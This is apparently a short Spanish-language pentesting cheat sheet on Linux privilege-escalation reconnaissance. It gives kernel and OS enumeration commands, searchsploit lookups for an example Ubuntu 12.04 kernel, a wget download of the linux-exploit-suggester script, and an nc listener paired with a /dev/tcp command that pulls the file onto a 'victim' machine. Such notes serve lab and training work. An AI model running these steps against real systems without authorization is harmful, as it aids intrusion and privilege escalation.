Tenemos los siguientes comandos para ver que version de OS y kernel utiliza la maquina:

_1)_ Comandos para reconocer versiones del sistema 
`uname -a
`cat /etc/os-release
`cat /proc/version
`lsb_release -a

_2)_ Comandos para reconocimientos de kernel
`uname -r`

_3)_ Arquitectura
`uname -m`

---
Una vez conseguimos la info, podemos buscar exploits en _exploitdb_ para una posible escalada de privilegios. Supongamos que estamos frente a un _Ubuntu 12.04 LTS_, con un _kernel 3.2.0-23_:

```bash
searchsploit Ubuntu 12.04 LTS
searchsploit Linux Kernel 3.2.0-23
```
Eso nos va a devolver una serie de scripts que podemos utilizar para elevar privilegios.

---
Hay una herramienta llamada _les.sh_ que hace un reconocimiento del **kernel** (unicamente kernel) y se fija en problables scripts, CVEs, y demas para una posible escalada.
https://github.com/The-Z-Labs/linux-exploit-suggester

```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
```

Si la maquina no tiene wget o conexion a internet, lo obtenemos en nuestra maquina y ofrecemos el archivo:
```bash
nc -nlvp 4444 < les.sh
```

y en la maquina **victima**:
```bash
cat < /dev/tcp/192.168.0.0/4444 > les.sh
```
